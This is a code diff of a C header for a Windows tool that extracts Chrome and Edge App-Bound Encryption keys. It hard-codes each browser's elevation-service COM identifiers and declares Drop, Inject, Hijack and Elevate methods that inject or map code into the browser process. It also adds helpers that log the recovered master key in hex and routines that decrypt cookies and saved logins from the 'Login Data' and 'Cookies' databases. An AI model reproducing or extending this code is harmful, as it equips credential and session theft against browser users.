@@ -38,6 +38,7 @@
 #pragma comment(lib, "Ncrypt.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "oleaut32.lib")
+#pragma comment(lib, "runtimeobject.lib")
 
 #include "resource.h"
 
@@ -45,6 +46,7 @@
 
 #define ABE_KEY_SIZE           32
 #define ABE_LOCAL_STATE_MAX    (1 << 20)
+#define ABE_REQUEST_BLOB_SIZE  2048
 #define ABE_POLL_COUNT         2000
 #define ABE_POLL_SLACK_MS      15
 
@@ -66,8 +68,19 @@ typedef struct _ABE_BROWSER
     ULONG DecryptSlot;
 } ABE_BROWSER;
 
-extern const ABE_BROWSER AbeBrowsers[NetBrowserMax];
-extern const PCWSTR AbeMethodNames[MethodMax];
+/* ABE private data, indexed by NET_BROWSER_TYPE */
+static const ABE_BROWSER AbeBrowsers[NetBrowserMax] = {
+    /* Edge */
+    { L"Microsoft Edgekey1",
+      {0x1FCBE96C,0x1697,0x43AF,{0x91,0x40,0x28,0x97,0xC7,0xC6,0x97,0x67}},
+      {0xC9C2B807,0x7731,0x4F34,{0x81,0xB7,0x44,0xFF,0x77,0x79,0x52,0x2B}}, 8 },
+    /* Chrome */
+    { L"Google Chromekey1",
+      {0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B}},
+      {0x1BF5208B,0x295F,0x4992,{0xB5,0xF4,0x3A,0x9B,0xB6,0x49,0x48,0x38}}, 5 },
+};
+
+static const PCWSTR AbeMethodNames[MethodMax] = { L"Drop", L"Inject", L"Hijack", L"Elevate" };
 
 /*** worker result ***/
 
@@ -91,33 +104,138 @@ typedef struct _ABE_RESULT
     ULONG PasswordCapacity;
 } ABE_RESULT, *PABE_RESULT;
 
-/* running log of the worker, also used for the final status text */
-extern WCHAR g_Log[4096];
+/* running log target of the active worker */
+extern PABE_RESULT g_AbeResult;
 
+FORCEINLINE
 VOID
 AbeLog(
-    _In_z_ _Printf_format_string_ PCWSTR Format,
-    ...);
+    _In_ _Printf_format_string_ PCWSTR Format,
+    ...)
+{
+    WCHAR Stack[512];
+    PWSTR Text = Stack;
+    ULONG Length;
+    PABE_RESULT Result = g_AbeResult;
+    va_list Args;
 
-/* appends "!!! <Name> KEY: <hex> !!!" in one shot */
-VOID
-AbeLogKey(
-    _In_z_ PCWSTR Name,
-    _In_reads_bytes_(ABE_KEY_SIZE) const BYTE* Key);
+    if (Result == NULL || wcslen(Result->Status) >= ARRAYSIZE(Result->Status) - 1)
+    {
+        return;
+    }
+
+    va_start(Args, Format);
+    Length = Str_VPrintfExW(Text, ARRAYSIZE(Stack), Format, Args);
+    va_end(Args);
+    if (Length == 0 && Stack[0] == UNICODE_NULL)
+    {
+        Text = Mem_Alloc(sizeof(Result->Status));
+        if (Text == NULL)
+        {
+            return;
+        }
+        va_start(Args, Format);
+        Length = Str_VPrintfExW(Text, ARRAYSIZE(Result->Status), Format, Args);
+        va_end(Args);
+    }
+    if (Length != 0)
+    {
+        Str_CatExW(Result->Status, ARRAYSIZE(Result->Status), Text);
+    }
+    if (Text != Stack)
+    {
+        Mem_Free(Text);
+    }
+}
 
 /* formats a key as 64 hex digits plus the terminator */
+FORCEINLINE
 VOID
 AbeFormatKeyHex(
     _In_reads_bytes_(ABE_KEY_SIZE) const BYTE* Key,
-    _Out_writes_(ABE_KEY_SIZE * 2 + 1) PSTR Text);
+    _Out_writes_(ABE_KEY_SIZE * 2 + 1) PSTR Text)
+{
+    static const CHAR HexDigits[] = "0123456789ABCDEF";
+    ULONG i;
 
-/* creates the browser process with the given creation flags (no extra frills) */
-_Success_(return)
+    for (i = 0; i < ABE_KEY_SIZE; i++)
+    {
+        Text[i * 2] = HexDigits[Key[i] >> 4];
+        Text[i * 2 + 1] = HexDigits[Key[i] & 0xF];
+    }
+    Text[ABE_KEY_SIZE * 2] = ANSI_NULL;
+}
+
+/* appends "!!! <Name> KEY: <hex> !!!" in one shot */
+FORCEINLINE
+VOID
+AbeLogKey(
+    _In_ PCWSTR Name,
+    _In_reads_bytes_(ABE_KEY_SIZE) const BYTE* Key)
+{
+    CHAR Hex[ABE_KEY_SIZE * 2 + 1];
+
+    AbeFormatKeyHex(Key, Hex);
+    AbeLog(L"!!! %ls KEY: %hs !!!\r\n", Name, Hex);
+}
+
+/* creates the browser process with optional arguments and startup window state */
+FORCEINLINE
+_Success_(return != FALSE)
+BOOL
+AbeCreateBrowserProcessEx(
+    _In_ PCWSTR ExePath,
+    _In_opt_ PCWSTR Arguments,
+    _In_ DWORD CreationFlags,
+    _In_ WORD ShowWindow,
+    _Out_ LPPROCESS_INFORMATION ProcessInformation)
+{
+    WCHAR CommandLine[MAX_PATH + 128];
+    STARTUPINFOW Si;
+
+    RtlZeroMemory(&Si, sizeof(Si));
+    Si.cb = sizeof(Si);
+    if (ShowWindow != SW_SHOWNORMAL)
+    {
+        Si.dwFlags = STARTF_USESHOWWINDOW;
+        Si.wShowWindow = ShowWindow;
+    }
+    if (Arguments != NULL && Arguments[0] != UNICODE_NULL)
+    {
+        Str_PrintfExW(CommandLine, ARRAYSIZE(CommandLine), L"\"%ls\" %ls", ExePath, Arguments);
+    } else
+    {
+        Str_PrintfExW(CommandLine, ARRAYSIZE(CommandLine), L"\"%ls\"", ExePath);
+    }
+    return CommandLine[0] != UNICODE_NULL &&
+           CreateProcessInternalW(NULL,
+                                  ExePath,
+                                  CommandLine,
+                                  NULL,
+                                  NULL,
+                                  FALSE,
+                                  CreationFlags,
+                                  NULL,
+                                  NULL,
+                                  &Si,
+                                  ProcessInformation,
+                                  NULL);
+}
+
+FORCEINLINE
+_Success_(return != FALSE)
 BOOL
 AbeCreateBrowserProcess(
-    _In_z_ PCWSTR ExePath,
+    _In_ PCWSTR ExePath,
     _In_ DWORD CreationFlags,
-    _Out_ LPPROCESS_INFORMATION ProcessInformation);
+    _Out_ LPPROCESS_INFORMATION ProcessInformation)
+{
+    return AbeCreateBrowserProcessEx(ExePath,
+                                     NULL,
+                                     CreationFlags,
+                                     SW_SHOWNORMAL,
+                                     ProcessInformation);
+}
 
 /*** payload shared with the in-browser payload (Payload.c) ***/
 
@@ -126,8 +244,8 @@ AbeCreateBrowserProcess(
 typedef struct _ABE_REQUEST
 {
     NET_BROWSER_TYPE BrowserType;
-    ULONG LocalStateLength;
-    BYTE LocalState[ABE_LOCAL_STATE_MAX];
+    ULONG BlobLength;                   /* APPB blob, prefix included */
+    BYTE Blob[ABE_REQUEST_BLOB_SIZE];
 } ABE_REQUEST, *PABE_REQUEST;
 #pragma pack(pop)
 
@@ -136,7 +254,7 @@ extern volatile LONG g_Code;                /* payload result, 0 or HRESULT */
 extern volatile BYTE g_Key[ABE_KEY_SIZE];   /* the v20 key */
 extern volatile ABE_REQUEST g_Request;
 
-_Success_(return)
+_Success_(return != FALSE)
 BOOL
 AbePrepareRequest(
     _In_ const NET_BROWSER_INFO* Browser);
@@ -155,7 +273,7 @@ AbeInjectEntry(LPVOID Param);
 
 /*** self-map (SelfMap.c) ***/
 
-_Success_(return)
+_Success_(return != FALSE)
 BOOL
 AbeMapSelf(
     _In_ HANDLE Process,
@@ -171,33 +289,33 @@ AbeWaitRemoteResult(
 
 /*** methods ***/
 
-_Success_(return)
+_Success_(return != FALSE)
 BOOL
 AbeGetKeyHijack(
     _In_ const NET_BROWSER_INFO* Browser,
     _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key);
 
-_Success_(return)
+_Success_(return != FALSE)
 BOOL
 AbeGetKeyInject(
     _In_ const NET_BROWSER_INFO* Browser,
     _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key);
 
-_Success_(return)
+_Success_(return != FALSE)
 BOOL
 AbeGetKeyDrop(
     _In_ const NET_BROWSER_INFO* Browser,
     _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key);
 
 /* Drop child: runs from the browser directory, reports the key on stdout */
-_Success_(return)
+_Success_(return != FALSE)
 BOOL
 AbeDropChild(
     _In_ const NET_BROWSER_INFO* Browser);
 
 /* on success EnvelopeVersion (optional) receives the private envelope
    version: 1, 2 or 3 (0 when the payload is a raw key, e.g. legacy Edge) */
-_Success_(return)
+_Success_(return != FALSE)
 BOOL
 AbeGetKeyElevate(
     _In_ const NET_BROWSER_INFO* Browser,
@@ -234,17 +352,17 @@ AbeGcmDecrypt(
 
 /* reads os_crypt.<Field> of Local State, base64-decodes it into Blob
    (APPB/DPAPI prefix kept) */
-_Success_(return)
+_Success_(return != FALSE)
 BOOL
 AbeReadOsCryptBlob(
-    _In_z_ PCWSTR UserDataDir,
-    _In_z_ PCWSTR Field,
+    _In_ PCWSTR UserDataDir,
+    _In_ PCWSTR Field,
     _Out_writes_bytes_(BlobSize) PBYTE Blob,
     _In_ ULONG BlobSize,
     _Inout_ PULONG BlobLength);
 
 /* v10 key (user DPAPI, always available) */
-_Success_(return)
+_Success_(return != FALSE)
 BOOL
 AbeGetV10Key(
     _In_ const NET_BROWSER_INFO* Browser,
@@ -255,7 +373,7 @@ AbeGetV10Key(
 VOID
 AbeCollectRecords(
     _In_ const NET_BROWSER_INFO* Browser,
-    _In_z_ PCWSTR Profile,
+    _In_ PCWSTR Profile,
     _In_z_ PCSTR DbFile,               /* "Network\\Cookies", "Login Data", "Login Data For Account" */
     _In_ LOGICAL IsCookie,
     _In_opt_ _In_reads_bytes_(ABE_KEY_SIZE) const BYTE* V10Key,
